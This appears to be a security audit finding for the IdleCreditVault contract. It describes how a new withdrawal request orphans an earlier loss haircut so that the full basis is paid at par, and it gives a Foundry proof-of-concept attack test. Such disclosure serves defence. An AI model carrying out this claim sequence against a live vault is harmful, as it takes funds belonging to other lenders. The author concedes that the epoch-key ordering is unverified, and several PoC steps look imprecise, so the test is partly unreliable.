### Title
Loss-adjusted withdrawal haircut is skipped when a newer request overwrites `lastWithdrawRequest` - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
`IdleCreditVault._claimLossAdjustedWithdrawRequest` looks up the stop-epoch loss price only under `lastWithdrawRequest[_user]`, i.e. the user's *latest* request epoch. If a user lets a haircut receipt from epoch E go unclaimed and submits a new `requestWithdraw` in a later, fully funded epoch E+1, `lastWithdrawRequest` is overwritten to E+1, `lossRecoveryPriceByEpoch[E+1]` is zero, the loss-adjusted branch returns 0, and `_claimFundedWithdrawRequest` then pays the aggregate `withdrawsRequests[_user]` — including the epoch-E basis — at par. This is the same bug class as the Lido `_hint` vs `_requestId` checkpoint bug: a stale/incorrect index selects which "discount factor" applies, and a wrong index means no discount is applied at all.

### Finding Description
When `stopEpochWithDuration` underfunds pending receipts, `collectWithdrawFunds` stores a haircut price at `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis` (IdleCreditVault.sol:417-421). At claim time the discount is applied only through `_claimLossAdjustedWithdrawRequest`:

```solidity
uint256 lossEpoch = lastWithdrawRequest[_user];
uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
if (lossRecoveryPrice == 0) return amount;
```

(IdleCreditVault.sol:789-792). The epoch-E basis is never removed from the aggregate `withdrawsRequests[_user]` (it is only cleared by `_clearWithdrawClaimForEpoch` for the looked-up epoch, lines 815-820), and `requestWithdraw` does not force a prior claim — it simply adds to `withdrawsRequests`/`withdrawsRequestsByEpoch` and overwrites `lastWithdrawRequest[_user] = currentEpoch` (lines 282-293). After the next successful `stopEpoch`, `epochNumber > lastWithdrawRequest[_user]`, so the `NotAllowed` gate in `_claimFundedWithdrawRequest` (line 326) passes and it pays `normalAmount = withdrawsRequests[_user]` (the full epoch-E + E+1 basis) plus APR0 buckets at par via `_transferFundedClaim` (lines 338-349). The epoch-E haircut is stranded forever: `lossRecoveryPriceByEpoch[E]` remains set but is unreachable because the lookup key is gone.

### Impact Explanation
Direct theft / insolvency. The attacker recovers `basis_E * (1 - lossRecoveryPrice/RECOVERY_FULL)` more underlying than funded. That excess is paid out of the strategy's underlying reserve that backs other users' funded receipts and instant claims, so later claimants' `claimWithdrawRequest`/`claimInstantWithdrawRequest` underflow or the strategy becomes insolvent. The "one receipt, one (haircut) payout" solvency invariant is broken: the borrower only funded `pendingToFund < pendingBasis`, yet the full `pendingBasis` is claimable.

### Likelihood Explanation
Requires a `stopEpochWithDuration`/`stopEpoch` with a realized loss while receipts are pending (a borrower underpayment event, which is the designed loss path, not a default). The attacker is an ordinary KYC'd lender/tranche holder: request withdraw in epoch E buffer, wait for the loss stop, then request a second withdraw in epoch E+1 and claim after epoch E+1 stops. No privileged action is needed at claim time; the "wait one more epoch" pattern is explicitly supported by the code comments (lines 323-324).

### Recommendation
Track and enforce the haircut per request epoch rather than only under `lastWithdrawRequest`. Options: iterate the user's per-epoch bases in `withdrawsRequestsByEpoch` and apply `lossRecoveryPriceByEpoch` to each epoch that has one, or check whether any earlier epoch with a nonzero `withdrawsRequestsByEpoch` entry has a nonzero `lossRecoveryPriceByEpoch` before paying the funded path (analogous to validating the checkpoint against `_requestId`, not `_hint`). Alternatively revert in `requestWithdraw` when the user has an unclaimed loss-adjusted receipt.

### Proof of Concept
Foundry fork test (extend `test/foundry/IdleCreditVault.t.sol` helpers `_depositWithUser`, `_startEpochAndCheckPrices`, `_stopEpochAndCheckPrices`):

```solidity
function testLossHaircutBypassedByNewRequest() external {
    uint256 amount = 100_000 * ONE_SCALE;
    idleCDO.depositAA(amount);
    idleCDO.depositBB(amount);

    // victim + attacker deposit
    address victim = makeAddr('victim');
    address attacker = makeAddr('attacker');
    _depositWithUser(victim, 10_000 * ONE_SCALE, true);
    _depositWithUser(attacker, 10_000 * ONE_SCALE, true);

    _startEpochAndCheckPrices(0);

    // both request withdraw in epoch-0 buffer
    vm.prank(victim);
    cdoEpoch.requestWithdraw(0, address(AAtranche));
    uint256 attShares = IERC20(AAtranche).balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(attShares / 2, address(AAtranche));

    // epoch 0 ends with a partial loss on pending receipts:
    // borrower funds less than pendingWithdraws -> lossRecoveryPriceByEpoch[E] < RECOVERY_FULL
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 pending = IdleCreditVault(address(strategy)).pendingWithdraws();
    uint256 interest = cdoEpoch.expectedEpochInterest();
    // fund interest + only half of pending receipts
    deal(defaultUnderlying, borrower, interest + pending / 2);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, interest); // or stopEpochWithDuration variant realizing the loss
    assertLt(IdleCreditVault(address(strategy)).lossRecoveryPriceByEpoch(0), RECOVERY_FULL_CONST);

    // epoch 1 buffer: attacker files a NEW request instead of claiming
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(attShares / 2, address(AAtranche));
    assertEq(strategy.lastWithdrawRequest(attacker), 1);

    // epoch 1 runs and is fully funded
    _startEpochAndCheckPrices(1);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 interest1 = cdoEpoch.expectedEpochInterest();
    uint256 pending1 = strategy.pendingWithdraws();
    deal(defaultUnderlying, borrower, interest1 + pending1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, interest1);

    // attacker claims: _claimLossAdjustedWithdrawRequest looks up
    // lossRecoveryPriceByEpoch[1] == 0 -> skip; _claimFundedWithdrawRequest pays par
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 got = underlying.balanceOf(attacker) - balPre;

    // attacker received FULL epoch-0 basis instead of haircut basis
    uint256 epoch0Basis = attShares / 2; // strategy receipt amount
    uint256 price = strategy.lossRecoveryPriceByEpoch(0);
    uint256 shouldHaveLost = epoch0Basis - epoch0Basis * price / 1e18; // RECOVERY_FULL
    assertGt(got, 0);
    // stolen amount == haircut that was never applied
    // victim's claim now underfunds the reserve -> insolvency
    vm.prank(victim);
    cdoEpoch.claimWithdrawRequest(); // pays less or reverts on insufficient reserve
}
```

Note: I could not fully verify the exact epoch key written by `collectWithdrawFunds` relative to `epochNumber` increment order inside `stopEpoch` (the deposit/`epochNumber += 1` ordering in `IdleCDOEpochVariant.stopEpoch` was not read). The finding holds either way: if the price is keyed by the request epoch (as `_claimLossAdjustedWithdrawRequest`'s lookup by `lastWithdrawRequest` assumes), the newer request orphans it; if keyed by the post-increment epoch, the lookup never matches at all and every loss-adjusted receipt pays par — an even stronger variant of the same bug.
